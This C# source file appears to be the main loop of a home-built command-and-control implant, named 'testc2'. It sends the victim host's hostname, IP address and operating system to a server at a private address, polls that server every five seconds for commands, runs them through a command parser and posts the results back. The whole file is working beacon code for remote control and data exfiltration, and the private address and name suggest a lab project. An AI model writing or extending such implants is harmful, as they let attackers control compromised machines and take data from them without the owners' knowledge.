using System;

namespace testc2
{
    class Program
    {
        static void Main(string[] args)
        {
            GeneralInfo infoObject = new GeneralInfo();
            Operations opsObj = new Operations(infoObject);
            string commandUri = "http://192.168.193.128/getcommand.php";
            string registerUri = "http://192.168.193.128/register.php";
            string getResult = "http://192.168.193.128/getresults.php";
            System.Net.WebClient webObj = new System.Net.WebClient();
            int exceptionCounter = 0;

            string parameters = "hostname=" + infoObject.hostName + "&ip=" + infoObject.ipv4Adress + "&operatingsystem=" + infoObject.oSystem;
            webObj.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
            webObj.UploadString(registerUri, parameters);

            while(true){
                if(exceptionCounter > 10)
                   break;
                try{
                    webObj.Headers.Add("Content-Type", "application/x-www-form-urlencoded");    
                    string takenCommand = webObj.UploadString(commandUri, parameters);

                    if(takenCommand.Length >1)
                    {    
                        string commandResult = opsObj.CommandParser(takenCommand);
                        string resultParameters = "hostname=" + infoObject.hostName + "&ip=" + infoObject.ipv4Adress + "&result="+ commandResult;
                        webObj.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                        webObj.UploadString(getResult, resultParameters);  
                    }
                    System.Threading.Thread.Sleep(5000);
                    exceptionCounter = 0;
                }
                catch{
                    System.Threading.Thread.Sleep(5000);
                    exceptionCounter += 1;
                }
            }
        }
    }
}
